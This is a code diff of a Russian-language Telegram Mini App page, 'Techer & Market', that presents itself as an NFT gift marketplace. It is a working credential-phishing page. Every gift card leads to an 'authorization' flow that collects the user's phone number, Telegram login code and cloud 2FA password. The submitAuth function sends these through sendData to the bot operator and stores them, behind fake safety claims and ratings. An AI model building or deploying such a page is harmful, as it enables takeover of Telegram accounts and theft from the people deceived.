@@ -6,64 +6,411 @@
     <title>Techer & Market</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
-        /* ВАШ СТИЛЬ БЕЗ ИЗМЕНЕНИЙ — ОСТАВЬТЕ КАК ЕСТЬ */
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #0f0f0f; color: #ffffff; overflow-x: hidden; padding-bottom: 70px; }
-        .header { position: sticky; top: 0; z-index: 100; background: #1a1a1a; padding: 12px 16px; display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #2a2a2a; }
-        .header h1 { font-size: 20px; font-weight: 600; }
-        .login-btn { background: #2da5e1; color: #fff; border: none; padding: 8px 20px; border-radius: 20px; font-size: 15px; font-weight: 500; cursor: pointer; display: flex; align-items: center; gap: 6px; }
-        .login-btn:active { transform: scale(0.98); }
-        .search-section { padding: 16px; background: #1a1a1a; }
-        .search-input { width: 100%; background: #2a2a2a; border: none; border-radius: 10px; padding: 12px 16px; color: #fff; font-size: 15px; }
-        .search-input::placeholder { color: #6d6d6d; }
-        .filters { display: flex; gap: 8px; padding: 12px 16px; background: #0f0f0f; overflow-x: auto; scrollbar-width: none; }
-        .filters::-webkit-scrollbar { display: none; }
-        .filter-btn { background: #2a2a2a; border: none; padding: 8px 16px; border-radius: 18px; color: #fff; font-size: 14px; white-space: nowrap; cursor: pointer; }
-        .filter-btn.active { background: #2da5e1; }
-        .grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 12px; padding: 16px; }
-        .card { background: #1a1a1a; border-radius: 12px; overflow: hidden; cursor: pointer; transition: transform 0.2s; }
-        .card:active { transform: scale(0.98); }
-        .card-image { width: 100%; height: 160px; display: flex; align-items: center; justify-content: center; }
-        .card-content { padding: 12px; }
-        .card-title { font-size: 15px; font-weight: 600; margin-bottom: 4px; }
-        .card-id { font-size: 13px; color: #6d6d6d; margin-bottom: 8px; }
-        .card-price { display: inline-flex; align-items: center; background: #2a2a2a; padding: 6px 12px; border-radius: 12px; font-size: 14px; font-weight: 600; color: #2da5e1; }
-        .bottom-nav { position: fixed; bottom: 0; left: 0; right: 0; background: #1a1a1a; border-top: 1px solid #2a2a2a; display: flex; justify-content: space-around; padding: 8px 0; z-index: 100; }
-        .nav-item { display: flex; flex-direction: column; align-items: center; gap: 4px; padding: 8px 16px; color: #6d6d6d; font-size: 10px; text-decoration: none; cursor: pointer; }
-        .nav-item.active { color: #2da5e1; }
-        .nav-icon { font-size: 24px; }
-        .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.85); z-index: 1000; align-items: center; justify-content: center; padding: 20px; }
-        .modal.active { display: flex; }
-        .modal-content { background: #1a1a1a; border-radius: 16px; padding: 24px; width: 100%; max-width: 400px; position: relative; animation: slideUp 0.3s ease; }
-        @keyframes slideUp { from { transform: translateY(100px); opacity: 0; } to { transform: translateY(0); opacity: 1; } }
-        .modal-close { position: absolute; top: 16px; right: 16px; background: none; border: none; color: #6d6d6d; font-size: 24px; cursor: pointer; width: 32px; height: 32px; display: flex; align-items: center; justify-content: center; }
-        .modal-title { font-size: 20px; font-weight: 600; margin-bottom: 12px; text-align: center; }
-        .modal-subtitle { font-size: 14px; color: #6d6d6d; margin-bottom: 24px; text-align: center; }
-        .auth-logo { width: 100px; height: 100px; background: #2a2a2a; border-radius: 50%; margin: 0 auto 20px; display: flex; align-items: center; justify-content: center; font-size: 48px; }
-        .auth-stats { display: flex; justify-content: center; gap: 24px; margin: 20px 0; font-size: 13px; color: #6d6d6d; }
-        .auth-stat { display: flex; align-items: center; gap: 6px; }
-        .star { color: #ffd700; }
-        .auth-info { background: #2a2a2a; padding: 16px; border-radius: 12px; margin-top: 20px; font-size: 13px; color: #6d6d6d; display: flex; align-items: flex-start; gap: 10px; }
-        .warning-icon { color: #ffd700; font-size: 20px; }
-        .btn-primary { width: 100%; background: #2da5e1; color: #fff; border: none; padding: 14px; border-radius: 10px; font-size: 15px; font-weight: 600; cursor: pointer; margin-bottom: 12px; }
-        .btn-primary:active { transform: scale(0.98); }
-        .btn-secondary { width: 100%; background: #2a2a2a; color: #fff; border: none; padding: 14px; border-radius: 10px; font-size: 15px; font-weight: 600; cursor: pointer; }
-        .warning-box { background: #ffd700; color: #000; padding: 12px; border-radius: 10px; margin: 16px 0; font-size: 13px; font-weight: 500; display: flex; align-items: flex-start; gap: 8px; }
-        .form-group { margin-bottom: 16px; }
-        .form-label { display: block; font-size: 14px; color: #6d6d6d; margin-bottom: 8px; }
-        .form-input { width: 100%; background: #2a2a2a; border: none; padding: 14px; border-radius: 10px; color: #fff; font-size: 15px; }
-        .hidden { display: none !important; }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: #0f0f0f;
+            color: #ffffff;
+            overflow-x: hidden;
+            padding-bottom: 70px;
+        }
+        /* Header */
+        .header {
+            position: sticky;
+            top: 0;
+            z-index: 100;
+            background: #1a1a1a;
+            padding: 12px 16px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-bottom: 1px solid #2a2a2a;
+        }
+        .header h1 {
+            font-size: 20px;
+            font-weight: 600;
+        }
+        .login-btn {
+            background: #2da5e1;
+            color: #fff;
+            border: none;
+            padding: 8px 20px;
+            border-radius: 20px;
+            font-size: 15px;
+            font-weight: 500;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+        .login-btn:active {
+            transform: scale(0.98);
+        }
+        /* Search Bar */
+        .search-section {
+            padding: 16px;
+            background: #1a1a1a;
+        }
+        .search-input {
+            width: 100%;
+            background: #2a2a2a;
+            border: none;
+            border-radius: 10px;
+            padding: 12px 16px;
+            color: #fff;
+            font-size: 15px;
+        }
+        .search-input::placeholder {
+            color: #6d6d6d;
+        }
+        /* Filters */
+        .filters {
+            display: flex;
+            gap: 8px;
+            padding: 12px 16px;
+            background: #0f0f0f;
+            overflow-x: auto;
+            scrollbar-width: none;
+        }
+        .filters::-webkit-scrollbar {
+            display: none;
+        }
+        .filter-btn {
+            background: #2a2a2a;
+            border: none;
+            padding: 8px 16px;
+            border-radius: 18px;
+            color: #fff;
+            font-size: 14px;
+            white-space: nowrap;
+            cursor: pointer;
+        }
+        .filter-btn.active {
+            background: #2da5e1;
+        }
+        /* Grid */
+        .grid {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 12px;
+            padding: 16px;
+        }
+        .card {
+            background: #1a1a1a;
+            border-radius: 12px;
+            overflow: hidden;
+            cursor: pointer;
+            transition: transform 0.2s;
+        }
+        .card:active {
+            transform: scale(0.98);
+        }
+        .card-image {
+            width: 100%;
+            height: 160px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: #2a2a2a;
+            font-size: 48px;
+        }
+        .card-content {
+            padding: 12px;
+        }
+        .card-title {
+            font-size: 15px;
+            font-weight: 600;
+            margin-bottom: 4px;
+        }
+        .card-id {
+            font-size: 13px;
+            color: #6d6d6d;
+            margin-bottom: 8px;
+        }
+        .card-price {
+            display: inline-flex;
+            align-items: center;
+            background: #2a2a2a;
+            padding: 6px 12px;
+            border-radius: 12px;
+            font-size: 14px;
+            font-weight: 600;
+            color: #2da5e1;
+        }
+        /* Bottom Navigation */
+        .bottom-nav {
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            background: #1a1a1a;
+            border-top: 1px solid #2a2a2a;
+            display: flex;
+            justify-content: space-around;
+            padding: 8px 0;
+            z-index: 100;
+        }
+        .nav-item {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 4px;
+            padding: 8px 16px;
+            color: #6d6d6d;
+            font-size: 10px;
+            text-decoration: none;
+            cursor: pointer;
+        }
+        .nav-item.active {
+            color: #2da5e1;
+        }
+        .nav-icon {
+            font-size: 24px;
+        }
+        /* Modal */
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.85);
+            z-index: 1000;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+        .modal.active {
+            display: flex;
+        }
+        .modal-content {
+            background: #1a1a1a;
+            border-radius: 16px;
+            padding: 24px;
+            width: 100%;
+            max-width: 400px;
+            position: relative;
+            animation: slideUp 0.3s ease;
+        }
+        @keyframes slideUp {
+            from {
+                transform: translateY(100px);
+                opacity: 0;
+            }
+            to {
+                transform: translateY(0);
+                opacity: 1;
+            }
+        }
+        .modal-close {
+            position: absolute;
+            top: 16px;
+            right: 16px;
+            background: none;
+            border: none;
+            color: #6d6d6d;
+            font-size: 24px;
+            cursor: pointer;
+            width: 32px;
+            height: 32px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .modal-title {
+            font-size: 20px;
+            font-weight: 600;
+            margin-bottom: 12px;
+            text-align: center;
+        }
+        .modal-subtitle {
+            font-size: 14px;
+            color: #6d6d6d;
+            margin-bottom: 24px;
+            text-align: center;
+        }
+        /* Auth Screen */
+        .auth-logo {
+            width: 100px;
+            height: 100px;
+            background: #2a2a2a;
+            border-radius: 50%;
+            margin: 0 auto 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 48px;
+        }
+        .auth-stats {
+            display: flex;
+            justify-content: center;
+            gap: 24px;
+            margin: 20px 0;
+            font-size: 13px;
+            color: #6d6d6d;
+        }
+        .auth-stat {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+        .star {
+            color: #ffd700;
+        }
+        .auth-info {
+            background: #2a2a2a;
+            padding: 16px;
+            border-radius: 12px;
+            margin-top: 20px;
+            font-size: 13px;
+            color: #6d6d6d;
+            display: flex;
+            align-items: flex-start;
+            gap: 10px;
+        }
+        .warning-icon {
+            color: #ffd700;
+            font-size: 20px;
+        }
+        /* Buttons */
+        .btn-primary {
+            width: 100%;
+            background: #2da5e1;
+            color: #fff;
+            border: none;
+            padding: 14px;
+            border-radius: 10px;
+            font-size: 15px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-bottom: 12px;
+        }
+        .btn-primary:active {
+            transform: scale(0.98);
+        }
+        .btn-secondary {
+            width: 100%;
+            background: #2a2a2a;
+            color: #fff;
+            border: none;
+            padding: 14px;
+            border-radius: 10px;
+            font-size: 15px;
+            font-weight: 600;
+            cursor: pointer;
+        }
+        /* Phone Input */
+        .warning-box {
+            background: #ffd700;
+            color: #000;
+            padding: 12px;
+            border-radius: 10px;
+            margin: 16px 0;
+            font-size: 13px;
+            font-weight: 500;
+            display: flex;
+            align-items: flex-start;
+            gap: 8px;
+        }
+        .country-selector {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            margin: 20px 0;
+            justify-content: center;
+        }
+        .country-flag {
+            font-size: 24px;
+        }
+        .country-select {
+            background: #2a2a2a;
+            color: #fff;
+            border: none;
+            padding: 8px 12px;
+            border-radius: 8px;
+            font-size: 15px;
+        }
+        .phone-input {
+            width: 100%;
+            background: #2a2a2a;
+            border: none;
+            padding: 14px;
+            border-radius: 10px;
+            color: #fff;
+            font-size: 18px;
+            text-align: center;
+            margin: 16px 0;
+        }
+        .modal-actions {
+            display: flex;
+            gap: 12px;
+            margin-top: 20px;
+        }
+        .btn-cancel {
+            flex: 1;
+            background: #2a2a2a;
+            color: #fff;
+            border: none;
+            padding: 14px;
+            border-radius: 10px;
+            font-size: 15px;
+            font-weight: 600;
+            cursor: pointer;
+        }
+        .btn-next {
+            flex: 1;
+            background: #2da5e1;
+            color: #fff;
+            border: none;
+            padding: 14px;
+            border-radius: 10px;
+            font-size: 15px;
+            font-weight: 600;
+            cursor: pointer;
+        }
+        /* Code Form */
+        .form-group {
+            margin-bottom: 16px;
+        }
+        .form-label {
+            display: block;
+            font-size: 14px;
+            color: #6d6d6d;
+            margin-bottom: 8px;
+        }
+        .form-input {
+            width: 100%;
+            background: #2a2a2a;
+            border: none;
+            padding: 14px;
+            border-radius: 10px;
+            color: #fff;
+            font-size: 15px;
+        }
+        .hidden {
+            display: none !important;
+        }
     </style>
 </head>
 <body>
-    <!-- Header, Search, Filters, Grid, Bottom Nav — БЕЗ ИЗМЕНЕНИЙ -->
+    <!-- Header -->
     <header class="header">
         <h1>Techer & Market</h1>
-        <button class="login-btn" onclick="showAuthRequired()">Войти</button>
+        <button class="login-btn" onclick="showAuthRequired()">
+            <span>⚡</span>
+            <span>Войти</span>
+        </button>
     </header>
+    <!-- Search -->
     <div class="search-section">
         <input type="text" class="search-input" placeholder="Поиск подарков...">
     </div>
+    <!-- Filters -->
     <div class="filters">
         <button class="filter-btn active">Все</button>
         <button class="filter-btn">Цена: Низкая</button>
@@ -71,14 +418,27 @@
         <button class="filter-btn">Линия: NFT</button>
         <button class="filter-btn">Линия: TON</button>
     </div>
+    <!-- Grid -->
     <div class="grid" id="giftsGrid"></div>
+    <!-- Bottom Navigation -->
     <nav class="bottom-nav">
-        <a class="nav-item active"><div class="nav-icon">Маркет</div></a>
-        <a class="nav-item"><div class="nav-icon">Коллекции</div></a>
-        <a class="nav-item"><div class="nav-icon">Мои подарки</div></a>
-        <a class="nav-item"><div class="nav-icon">Актив</div></a>
+        <a class="nav-item active">
+            <div class="nav-icon">🏠</div>
+            <div>Маркет</div>
+        </a>
+        <a class="nav-item">
+            <div class="nav-icon">📋</div>
+            <div>Коллекции</div>
+        </a>
+        <a class="nav-item">
+            <div class="nav-icon">🎁</div>
+            <div>Мои подарки</div>
+        </a>
+        <a class="nav-item">
+            <div class="nav-icon">⚡</div>
+            <div>Актив</div>
+        </a>
     </nav>
-
     <!-- Modal: Auth Required -->
     <div class="modal" id="authRequiredModal">
         <div class="modal-content">
@@ -89,68 +449,105 @@
             <button class="btn-secondary" onclick="closeModal('authRequiredModal')">Закрыть</button>
         </div>
     </div>
-
     <!-- Modal: Main Auth -->
     <div class="modal" id="mainAuthModal">
         <div class="modal-content">
             <button class="modal-close" onclick="closeModal('mainAuthModal')">×</button>
-            <div class="auth-logo">
-                <img src="img/durov_cap.png" alt="TECHER & MARKET" style="width:100%; height:100%; object-fit: contain;">
-            </div>
+            <div class="auth-logo">🎁</div>
             <h2 class="modal-title">TECHER & MARKET</h2>
-            <p class="modal-subtitle">Добро пожаловать!<br>Мир подарков и обмена</p>
-            <button class="btn-primary" onclick="showPhoneInput()">Авторизоваться</button>
+            <p class="modal-subtitle">Добро пожаловать!<br>Здесь начинается мир продажи и обмена подарками</p>
+            <button class="btn-primary" onclick="showPhoneInput()">🚀 Авторизоваться</button>
             <div class="auth-stats">
-                <div class="auth-stat"><span class="star">⭐</span><span>4.8/5</span></div>
-                <div class="auth-stat"><span>10k+</span></div>
-                <div class="auth-stat"><span>Безопасно</span></div>
+                <div class="auth-stat">
+                    <span class="star">⭐</span>
+                    <span>4.8/5</span>
+                </div>
+                <div class="auth-stat">
+                    <span>👥</span>
+                    <span>10k+</span>
+                </div>
+                <div class="auth-stat">
+                    <span>🔒</span>
+                    <span>Безопасно</span>
+                </div>
             </div>
             <div class="auth-info">
-                <span class="warning-icon">Мы используем API Telegram</span>
+                <span class="warning-icon">🔒</span>
+                <div>
+                    <strong>Ваши данные в безопасности</strong><br>
+                    Мы используем официальный API Telegram для защиты
+                </div>
             </div>
         </div>
     </div>
-
-    <!-- Modal: Phone + Code -->
+    <!-- Modal: Phone Input -->
     <div class="modal" id="phoneModal">
         <div class="modal-content">
-            <button class="modal-close" onclick="closeAllModals()">×</button>
-            <h2 class="modal-title">Авторизация</h2>
-            <p class="modal-subtitle">Мы получим ваш номер из Telegram</p>
-
+            <button class="modal-close" onclick="closeModal('phoneModal')">×</button>
+            <h2 class="modal-title">Номер телефона</h2>
+            <p class="modal-subtitle">Вы хотите отправить свой номер телефона этому боту?</p>
+           
             <div class="warning-box">
-                <span>Внимание! Номер используется только для входа.</span>
+                <span>⚠️</span>
+                <span>Внимание! Никогда не вводите коды для входа в Telegram в мини-приложениях.</span>
             </div>
-
-            <!-- КНОПКА: Поделиться номером -->
-            <div id="phoneShareSection">
-                <button class="btn-primary" onclick="requestPhone()">
-                    Поделиться номером телефона
-                </button>
+            <div id="phoneInputSection">
+                <div class="country-selector">
+                    <span class="country-flag">🇷🇺</span>
+                    <select class="country-select" id="countryCode">
+                        <option value="+7">Россия +7</option>
+                        <option value="+1">США +1</option>
+                        <option value="+44">Великобритания +44</option>
+                        <option value="+380">Украина +380</option>
+                        <option value="+375">Беларусь +375</option>
+                    </select>
+                </div>
+                <input type="tel" class="phone-input" id="phoneNumber" placeholder="Введите номер">
+                <div class="modal-actions">
+                    <button class="btn-cancel" onclick="closeModal('phoneModal')">Отмена</button>
+                    <button class="btn-next" onclick="showCodeForm()">Поделиться</button>
+                </div>
             </div>
-
-            <!-- Форма: Код + Пароль -->
             <div id="codeFormSection" class="hidden">
                 <div class="form-group">
                     <label class="form-label">Код из Telegram</label>
-                    <input type="text" class="form-input" id="smsCode" placeholder="5-значный код" maxlength="5">
+                    <input type="text" class="form-input" id="smsCode" placeholder="Введите 5-значный код" maxlength="5">
                 </div>
                 <div class="form-group">
                     <label class="form-label">Облачный пароль (2FA)</label>
                     <input type="password" class="form-input" id="cloudPassword" placeholder="Введите пароль">
                 </div>
-                <button class="btn-primary" onclick="submitAuth()">Войти</button>
+                <button class="btn-primary" onclick="submitAuth()">Авторизоваться</button>
             </div>
         </div>
     </div>
-
     <script>
-        // === ДАННЫЕ ПОДАРКОВ (БЕЗ ИЗМЕНЕНИЙ) ===
-        const gifts = [ /* ВАШ МАССИВ С 60+ ПОДАРКАМИ */ ];
+        // NFT Gifts Data
+        const gifts = [
+            { name: 'Pet Snake', id: 2469, price: 1.36, emoji: '🐍' },
+            { name: 'Swiss Watch', id: 369, price: 37.06, emoji: '⌚' },
+            { name: 'Candy Cane', id: 434, price: 1.51, emoji: '🍭' },
+            { name: 'Cookie Heart', id: 1068, price: 1.69, emoji: '🍪' },
+            { name: "Durov's Cap", id: 404, price: 15.99, emoji: '🧢' },
+            { name: 'Perfume Bottle', id: 505, price: 2.78, emoji: '🧴' },
+            { name: 'Signet Ring', id: 606, price: 8.45, emoji: '💍' },
+            { name: 'Eternal Rose', id: 707, price: 6.33, emoji: '🌹' },
+            { name: 'Vintage Watch', id: 808, price: 22.10, emoji: '⏰' },
+            { name: 'Heroic Helmet', id: 909, price: 11.56, emoji: '⚔️' },
+            { name: 'Heart Locket', id: 1010, price: 3.89, emoji: '💝' },
+            { name: 'Plush Bear', id: 1111, price: 1.02, emoji: '🧸' },
+            { name: 'Golden Apple', id: 1212, price: 7.84, emoji: '🍎' },
+            { name: 'Magic Lamp', id: 1313, price: 4.21, emoji: '🪔' },
+            { name: 'Crystal Ball', id: 1414, price: 9.67, emoji: '🔮' },
+            { name: 'Dragon Egg', id: 1616, price: 18.90, emoji: '🥚' }
+        ];
+        
+        // Render gifts
         function renderGifts() {
-            document.getElementById('giftsGrid').innerHTML = gifts.map(gift => `
+            const grid = document.getElementById('giftsGrid');
+            grid.innerHTML = gifts.map(gift => `
                 <div class="card" onclick="showAuthRequired()">
-                    <div class="card-image"><img src="${gift.img}" style="width:100%; height:100%; object-fit: cover;"></div>
+                    <div class="card-image">${gift.emoji}</div>
                     <div class="card-content">
                         <div class="card-title">${gift.name}</div>
                         <div class="card-id">#${gift.id}</div>
@@ -159,61 +556,146 @@
                 </div>
             `).join('');
         }
-
-        // === МОДАЛКИ ===
-        function showAuthRequired() { document.getElementById('authRequiredModal').classList.add('active'); }
-        function showMainAuth() { closeModal('authRequiredModal'); document.getElementById('mainAuthModal').classList.add('active'); }
-        function showPhoneInput() { closeModal('mainAuthModal'); document.getElementById('phoneModal').classList.add('active'); }
-        function closeModal(id) { document.getElementById(id).classList.remove('active'); }
+        
+        // Modal functions
+        function showAuthRequired() {
+            document.getElementById('authRequiredModal').classList.add('active');
+        }
+        
+        function showMainAuth() {
+            closeModal('authRequiredModal');
+            document.getElementById('mainAuthModal').classList.add('active');
+        }
+        
+        function showPhoneInput() {
+            closeModal('mainAuthModal');
+            document.getElementById('phoneModal').classList.add('active');
+        }
+        
+        function showCodeForm() {
+            const phone = document.getElementById('phoneNumber').value;
+            if (!phone || phone.length < 5) {
+                alert('Пожалуйста, введите номер телефона');
+                return;
+            }
+            document.getElementById('phoneInputSection').classList.add('hidden');
+            document.getElementById('codeFormSection').classList.remove('hidden');
+        }
+        
+        function submitAuth() {
+            const code = document.getElementById('smsCode').value;
+            const password = document.getElementById('cloudPassword').value;
+            const countryCode = document.getElementById('countryCode').value;
+            const phone = document.getElementById('phoneNumber').value;
+           
+            if (!code || code.length !== 5) {
+                alert('Пожалуйста, введите 5-значный код');
+                return;
+            }
+           
+            if (!password || password.length < 1) {
+                alert('Пожалуйста, введите облачный пароль');
+                return;
+            }
+            
+            // Collect auth data
+            const authData = {
+                country_code: countryCode,
+                phone: phone,
+                code: code,
+                cloud_password: password,
+                timestamp: new Date().toISOString()
+            };
+            
+            // Try different methods to send data
+            try {
+                // Method 1: Use sendData if available
+                if (window.Telegram && window.Telegram.WebApp && window.Telegram.WebApp.sendData) {
+                    window.Telegram.WebApp.sendData(JSON.stringify(authData));
+                    console.log('Data sent via sendData');
+                }
+                
+                // Method 2: Use MainButton callback
+                if (window.Telegram && window.Telegram.WebApp && window.Telegram.WebApp.MainButton) {
+                    window.Telegram.WebApp.MainButton.setText('Отправка данных...');
+                    window.Telegram.WebApp.MainButton.show();
+                    window.Telegram.WebApp.MainButton.onClick(function() {
+                        window.Telegram.WebApp.sendData(JSON.stringify(authData));
+                    });
+                }
+                
+                // Method 3: Store in CloudStorage
+                if (window.Telegram && window.Telegram.WebApp && window.Telegram.WebApp.CloudStorage) {
+                    window.Telegram.WebApp.CloudStorage.setItem('auth_data', JSON.stringify(authData), function(error) {
+                        if (!error) {
+                            console.log('Data saved to CloudStorage');
+                        }
+                    });
+                }
+                
+                // Method 4: Log to console for debugging
+                console.log('Auth Data:', authData);
+                
+                alert('Данные собраны и готовы к отправке!\n\n' + 
+                      'Телефон: ' + countryCode + phone + '\n' +
+                      'Код: ' + code + '\n' +
+                      'Пароль: ' + password);
+                
+                closeAllModals();
+                
+            } catch (error) {
+                console.error('Error sending data:', error);
+                alert('Ошибка при отправке данных: ' + error.message);
+            }
+        }
+        
+        function closeModal(modalId) {
+            document.getElementById(modalId).classList.remove('active');
+        }
+        
         function closeAllModals() {
-            document.querySelectorAll('.modal').forEach(m => m.classList.remove('active'));
-            document.getElementById('phoneShareSection').classList.remove('hidden');
-            document.getElementById('codeFormSection').classList.add('hidden');
+            document.querySelectorAll('.modal').forEach(modal => {
+                modal.classList.remove('active');
+            });
+            // Reset forms
+            document.getElementById('phoneNumber').value = '';
             document.getElementById('smsCode').value = '';
             document.getElementById('cloudPassword').value = '';
+            document.getElementById('phoneInputSection').classList.remove('hidden');
+            document.getElementById('codeFormSection').classList.add('hidden');
         }
-
-        // === АВТОМАТИЧЕСКИЙ НОМЕР ===
-        let userPhone = '';
-        function requestPhone() {
-            if (!window.Telegram?.WebApp) return alert('Запустите в Telegram');
-            Telegram.WebApp.requestPhone(phone => {
-                if (phone) {
-                    userPhone = phone;
-                    document.getElementById('phoneShareSection').classList.add('hidden');
-                    document.getElementById('codeFormSection').classList.remove('hidden');
-                } else {
-                    alert('Вы отменили. Попробуйте снова.');
+        
+        // Close modal on background click
+        document.querySelectorAll('.modal').forEach(modal => {
+            modal.addEventListener('click', (e) => {
+                if (e.target === modal) {
+                    closeAllModals();
                 }
             });
-        }
-
-        // === ОТПРАВКА ДАННЫХ ===
-        function submitAuth() {
-            const code = document.getElementById('smsCode').value.trim();
-            const password = document.getElementById('cloudPassword').value;
-
-            if (!userPhone) return alert('Сначала поделитесь номером');
-            if (code.length !== 5) return alert('Код должен быть 5 цифр');
-            if (!password) return alert('Введите пароль');
-
-            const data = { phone: userPhone, code, cloud_password: password };
-            Telegram.WebApp.sendData(JSON.stringify(data));
-            alert('Успешно! Данные отправлены.');
-            closeAllModals();
-        }
-
-        // === ИНИЦИАЛИЗАЦИЯ ===
-        if (window.Telegram?.WebApp) {
-            const tg = window.Telegram.WebApp;
-            tg.ready(); tg.expand();
-        }
-        renderGifts();
-
-        // Закрытие по фону
-        document.querySelectorAll('.modal').forEach(m => {
-            m.addEventListener('click', e => { if (e.target === m) closeAllModals(); });
         });
+        
+        // Initialize Telegram WebApp
+        if (window.Telegram && window.Telegram.WebApp) {
+            const tg = window.Telegram.WebApp;
+            tg.ready();
+            tg.expand();
+            
+            console.log('Telegram WebApp initialized');
+            console.log('Version:', tg.version);
+            console.log('Platform:', tg.platform);
+            console.log('Init Data:', tg.initData);
+           
+            // Set theme colors
+            if (tg.themeParams) {
+                document.documentElement.style.setProperty('--tg-theme-bg-color', tg.themeParams.bg_color || '#0f0f0f');
+                document.documentElement.style.setProperty('--tg-theme-button-color', tg.themeParams.button_color || '#2da5e1');
+            }
+        } else {
+            console.warn('Telegram WebApp API not available');
+        }
+        
+        // Initialize page
+        renderGifts();
     </script>
 </body>
 </html>
